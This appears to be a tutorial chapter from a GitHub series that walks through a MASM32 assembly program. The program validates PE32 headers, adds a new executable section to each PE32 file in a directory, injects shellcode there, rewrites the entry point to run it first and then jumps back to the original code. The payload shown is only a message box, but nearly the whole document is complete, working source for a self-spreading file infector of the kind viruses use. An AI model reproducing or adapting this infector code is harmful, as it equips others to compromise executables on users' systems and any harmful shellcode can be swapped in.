# A. Preparation

1. **Program Language**

Since I am using with Assembly in Windows, we should install MASM32 package [here](https://masm32.com/) to use the Windows library

In this chapter, I am using MASM32 macros so it looks like C code in some ways

2. **The idea**

To infect all PE32 within a directory, my idea was below:

![](https://github.com/0r3o-r3vEr5e/Episode-2-PE-Code-Injector/blob/main/Images/Idea.png)

Now let's start coding!

# B. Coding Time

## I. Check if a file is PE32 or not?

To do this, we need to check 3 things of a file:

- `e_magic` in `DOS Header`
- `Signature` in `NT Headers`
- `Magic` in `Optional Header`

And the `proc` should be like this:

```asm
.386
option casemap :none

INCLUDE \masm32\include\masm32rt.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
INCLUDELIB \masm32\lib\masm32.lib

.data
    hFile dd ?
    bytesRead dd ?
    DOSHeader IMAGE_DOS_HEADER <>
    PEHeader IMAGE_NT_HEADERS <>

.code
isPE32 proc filename:DWORD
    invoke CreateFile, filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    mov hFile, eax
    .if hFile == INVALID_HANDLE_VALUE
        xor eax, eax
        ret
    .endif

    ; Check e_magic in DOS Header
    invoke ReadFile, hFile, addr DOSHeader, sizeof IMAGE_DOS_HEADER, addr bytesRead, NULL
    .if DOSHeader.e_magic != IMAGE_DOS_SIGNATURE
        jmp _exit
    .endif

    ; Check Signature in NT Headers
    invoke SetFilePointer, hFile, DOSHeader.e_lfanew, NULL, FILE_BEGIN
    invoke ReadFile, hFile, addr PEHeader, sizeof IMAGE_NT_HEADERS, addr bytesRead, NULL
    .if PEHeader.Signature != IMAGE_NT_SIGNATURE
        jmp _exit
        
    .endif

    ; Check Magic in Optional Header
    .if (PEHeader.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC)
        jmp _exit
    .endif
    invoke CloseHandle, hFile
    mov eax, 1
    ret

_exit:
    invoke CloseHandle, hFile
    xor eax, eax
    ret

isPE32 endp
```

> **Tips:**
> You can print out message in certain places for debugging. I had to do it since I couldn't file any appropriate debuggers for MASM32 

## II. Add Section

I was trying to code this function like the C++ code in Chapter 1. But I am not good at handling pointer in Assembly :<< 
=> So my idea was set file pointer properly to read file to store headers in structures, edit those structures and then write into the file. Now just break down this into some smaller tasks.

#### 1. Store Headers

I am using ReadFile(), SetFilePointer() to do this
(As I mentioned, I am sucks at handling pointers in MASM)

```asm
.data
    hFile dd ?
    bytesRead dd ?
    bytesWritten dd ?
    DOSHeader IMAGE_DOS_HEADER <>
    PEHeader IMAGE_NT_HEADERS <>
    lastSectionHeader IMAGE_SECTION_HEADER <>
    newSectionHeader IMAGE_SECTION_HEADER <>

.code
addSection proc filename:DWORD
    ; Open file
    invoke CreateFile, filename, GENERIC_READ or GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL

    ; Get DOS Header
    mov hFile, eax
    invoke ReadFile, hFile, addr DOSHeader, sizeof IMAGE_DOS_HEADER, addr bytesRead, NULL
    

    ; Get NT Headers
    invoke SetFilePointer, hFile, DOSHeader.e_lfanew, NULL, FILE_BEGIN
    invoke ReadFile, hFile, addr PEHeader, sizeof IMAGE_NT_HEADERS, addr bytesRead, NULL

    ; Get the last section header
    movzx ecx, PEHeader.FileHeader.NumberOfSections
    imul ecx, ecx, sizeof IMAGE_SECTION_HEADER
    sub ecx, sizeof IMAGE_SECTION_HEADER

    invoke SetFilePointer, hFile, ecx, NULL, FILE_CURRENT
    invoke ReadFile, hFile, addr lastSectionHeader, sizeof IMAGE_SECTION_HEADER, addr bytesRead, NULL

```

> **Why am I getting data of the last section?**
> I need to calculate some data fields of the `newSectionHeader`, which depends on the data stored in `lastSectionHeader`.

### 2. Setup new section header

Since the `VirtualSize`, `VirtualAddress` and `PointerToRawData` should be aligned by `FileAlignment` and `SectionAlignment`, I need a proc to align these data fields.

```asm
alignUp proc alignSize:DWORD, alignment:DWORD
    mov eax, alignSize
    mov edx, alignment
    add eax, edx                ; alignSize + alignment
    dec eax                     ; alignSize + alignment - 1
    dec edx                     ; alignment - 1
    not edx                     ; ~(alignment - 1)
    and eax, edx                ; (alignSize + alignment - 1) & ~(alignment - 1)
    ret

alignUp endp
```

Now we can setup a new section header properly. Don't forget to initialize data in `.data` section. (Just continue coding with the code above. I am just showing the code that does the thing I mention before)

```asm
.data
    ; New section properties
    newSectionSize dd 1000h
    newSectionOffset dd ?

.code
    ; Setup new section properties
    ; Calculate new section offset
    mov ebx, lastSectionHeader.PointerToRawData
    add ebx, lastSectionHeader.SizeOfRawData
    invoke alignUp, ebx, PEHeader.OptionalHeader.FileAlignment
    mov newSectionOffset, eax

    ; Calculate new section aligned size 
    mov ebx, newSectionSize
    invoke alignUp, ebx, PEHeader.OptionalHeader.SectionAlignment
    mov newSectionSize, eax

    ; Section VirtualSize and RawSize
    mov ebx, newSectionSize
    mov newSectionHeader.Misc.VirtualSize, ebx
    mov newSectionHeader.SizeOfRawData, ebx
    
    ; Section Raw Address
    mov ebx, newSectionOffset
    mov newSectionHeader.PointerToRawData, ebx

    ; Section Virtual Address
    mov eax, lastSectionHeader.VirtualAddress
    mov ebx, lastSectionHeader.Misc.VirtualSize
    add ebx, eax
    invoke alignUp, ebx, PEHeader.OptionalHeader.SectionAlignment
    mov newSectionHeader.VirtualAddress, eax

    ; Section Characteristics
    mov newSectionHeader.Characteristics, 0E00000E0h 

    ; Increase number of section
    mov bx, PEHeader.FileHeader.NumberOfSections
    inc bx
    mov PEHeader.FileHeader.NumberOfSections, bx

    ; Update size of the image
    mov eax, newSectionHeader.VirtualAddress
    mov ebx, newSectionHeader.Misc.VirtualSize
    add eax, ebx
    mov PEHeader.OptionalHeader.SizeOfImage, eax

    ; Write data to the PE file
    invoke SetFilePointer, hFile, DOSHeader.e_lfanew, NULL, FILE_BEGIN
    lea esi, PEHeader
    invoke WriteFile, hFile, esi, sizeof IMAGE_NT_HEADERS, addr bytesWritten, NULL

    movzx ebx, PEHeader.FileHeader.NumberOfSections
    dec ebx
    imul ebx, ebx, sizeof IMAGE_SECTION_HEADER
    invoke SetFilePointer, hFile, ebx, NULL, FILE_CURRENT
    lea esi, newSectionHeader
    invoke WriteFile, hFile, esi, sizeof IMAGE_SECTION_HEADER, addr bytesWritten, NULL

    ; Set EOF
    mov eax, newSectionSize
    mov ebx, newSectionOffset
    add ebx, eax
    invoke SetFilePointer, hFile, ebx, NULL, FILE_BEGIN
    invoke SetEndOfFile, hFile

```

### 3. Insert data into new section

After setup the new section header, there should be a new empty section in the PE file. Now, we need to insert your code here (shellcode), set the new `AddressOfEntryPoint` to where your code is and then jump back to the original `AddressOfEntryPoint` of the PE file.

And like the thing I did in Chapter 1, I need to calculate the address for CALL and JMP instructions since they use a relative address.

```asm
.data
    moduleName db "user32.dll", 0
    procName db "MessageBoxA", 0

.code
calculateJMPAddress PROC instructionAddr:DWORD, targetAddr:DWORD
    mov eax, instructionAddr
    mov ebx, targetAddr
    .if eax < ebx 
        sub ebx, eax
        mov eax, ebx
        ret
    .endif
    mov ecx, 0ffffffffh
    sub ecx, eax
    add ecx, ebx
    inc ecx
    mov eax, ecx
    ret
calculateJMPAddress endp

getMessageBoxAAddress proc
    LOCAL user32Module:DWORD
    LOCAL messageBoxAddr:DWORD
    invoke LoadLibraryA, addr moduleName
    mov user32Module, eax
    .if user32Module != NULL
        invoke GetProcAddress, user32Module, addr procName
        mov messageBoxAddr, eax
        invoke FreeLibrary, user32Module
        .if messageBoxAddr != NULL
            mov eax, messageBoxAddr
            ret

        .endif
        
    .endif
    xor eax, eax
    ret

getMessageBoxAAddress endp
```

We can insert the shellcode into the section now. 

```asm
.data
    ; New section properties
    newSectionSize dd 1000h
    newSectionOffset dd ?
    injectText db "You've got injected!", 0
    injectTextOffset dd ?
    injectTitle db "Code Injector", 0
    injectTitleOffset dd ?
    shellCode db    6Ah, 00h, 
                    68h, 00h, 00h, 00h, 00h,
                    68h, 00h, 00h, 00h, 00h,
                    6Ah, 00h,
                    0E8h, 00h, 00h, 00h, 00h,
                    0e9h, 00h, 00h, 00h, 00h
    messageBoxARVA dd ?
    jmpRVA dd ?
    newEntryPoint dd ?

.code
    ; Write data to new section
    mov ebx, newSectionHeader.PointerToRawData
    add ebx, sizeof shellCode
    invoke SetFilePointer, hFile, ebx, NULL, FILE_BEGIN
    lea esi, injectText
    invoke WriteFile, hFile, esi, sizeof injectText, addr bytesWritten, NULL
    lea esi, injectTitle
    invoke WriteFile, hFile, esi, sizeof injectTitle, addr bytesWritten, NULL
    
    ; Calculate offset of data in shellcode
    mov ebx, sizeof shellCode
    mov injectTextOffset, ebx
    add ebx, sizeof injectText
    mov injectTitleOffset, ebx

    ; MessageBoxA's RVA for CALL instruction
    invoke getMessageBoxAAddress                    
    mov ebx, 19
    add ebx, PEHeader.OptionalHeader.ImageBase      
    add ebx, newSectionHeader.VirtualAddress        
    sub eax, ebx
    mov messageBoxARVA, eax 
    
    ; OEP's RVA for JMP instruction
    mov ebx, newSectionHeader.VirtualAddress
    add ebx, PEHeader.OptionalHeader.ImageBase
    add ebx, sizeof shellCode                               ; This should be the instructionAddress 

    mov ecx, PEHeader.OptionalHeader.AddressOfEntryPoint
    add ecx, PEHeader.OptionalHeader.ImageBase              ; This should be the targetAddress

    invoke calculateJMPAddress, ebx, ecx                    
    mov jmpRVA, eax

    ; Write the data into the shellcode
    lea edi, shellCode
    add edi, 3
    mov ebx, injectTitleOffset
    add ebx, newSectionHeader.VirtualAddress
    add ebx, PEHeader.OptionalHeader.ImageBase
    mov dword ptr [edi], ebx                                ; write injectTextOffset

    lea edi, shellCode
    add edi, 8
    mov ebx, injectTextOffset
    add ebx, newSectionHeader.VirtualAddress
    add ebx, PEHeader.OptionalHeader.ImageBase
    mov dword ptr [edi], ebx                                ; write injectTitleOffset

    lea edi, shellCode
    add edi, 15
    mov ebx, messageBoxARVA
    mov dword ptr [edi], ebx                                ; write messageBoxARVA

    lea edi, shellCode
    add edi, 20
    mov ebx, jmpRVA
    mov dword ptr [edi], ebx                                ; write jmpRVA

    ; Write shellCode into the file
    mov ebx, newSectionHeader.PointerToRawData
    invoke SetFilePointer, hFile, ebx, NULL, FILE_BEGIN
    lea esi, shellCode
    invoke WriteFile, hFile, esi, sizeof shellCode, addr bytesWritten, NULL

    ; Calculate new Entry Point and write it to file
    mov ebx, newSectionHeader.VirtualAddress
    mov PEHeader.OptionalHeader.AddressOfEntryPoint, ebx
    invoke SetFilePointer, hFile, DOSHeader.e_lfanew, NULL, FILE_BEGIN
    lea esi, PEHeader
    invoke WriteFile, hFile, esi, sizeof IMAGE_NT_HEADERS, addr bytesWritten, NULL
    invoke CloseHandle, hFile

    mov eax, 1
    ret

addSection endp
```

After this, the shellcode should be inserted and every time you run the PE file, the shellcode should be executed before the orginal code.

## III. Infect Directory

Like the diagram shown above, I can do it easily with every proc I have

```asm
.data
    asterisk db "*", 0
    buffer db MAX_PATH dup(?)

    searchPath db MAX_PATH dup(?)
    noFileMsg db "No file to infect in %s", 0

    usageFormat db "Usage: .\Injector.exe <directory_path>", 0
    cmdLine db MAX_PATH dup(?)

.code
infectDirectory proc dirPath:DWORD
    LOCAL hFind:HANDLE
    LOCAL findFileData:WIN32_FIND_DATA

    invoke lstrcpy, addr buffer, dirPath
    invoke lstrcat, addr buffer, addr asterisk
    invoke FindFirstFile, addr buffer, addr findFileData
    .if eax == INVALID_HANDLE_VALUE
        invoke wsprintf, addr buffer, addr noFileMsg, dirPath
        invoke MessageBoxA, NULL, addr buffer, addr injectTitle, MB_OK
        xor eax, eax
        ret
    .endif

    mov hFind, eax
    .WHILE TRUE
        invoke lstrcpy, addr searchPath, dirPath
        invoke lstrcat, addr searchPath, addr findFileData.cFileName
        invoke lstrlen, addr searchPath
        mov ecx, eax
        mov byte ptr [searchPath + ecx], 0  ; Explicitly null-terminate
        invoke isPE32, addr searchPath
        .if eax == TRUE
            invoke addSection, addr searchPath 
        .endif

        invoke FindNextFile, hFind, addr findFileData
        .break .if !eax 
    .ENDW

    invoke FindClose, hFind
    mov eax, 1
    ret

infectDirectory endp

main proc 
    push offset cmdLine
    push 1
    call GetCL

    mov ebx, offset cmdLine
    cmp byte ptr [ebx], 0
    je _printUsage

    invoke infectDirectory, offset cmdLine
    invoke ExitProcess, 0

_printUsage:
    invoke MessageBox, NULL, offset usageFormat, offset injectTitle, MB_OK
    invoke ExitProcess, 0
main endp
end main
```

> That's all how I did to inject shellcode into all PE32 files within a directory.
> During coding time, I have encounter certain problems with this MASM syntax, cannot setup it in Visual Studio or cannot find any proper debugger for this code. Those problems make it struggling to commplete this.

"Am I missing something? QmFzZSBSZWxvY2F0aW9uCg=="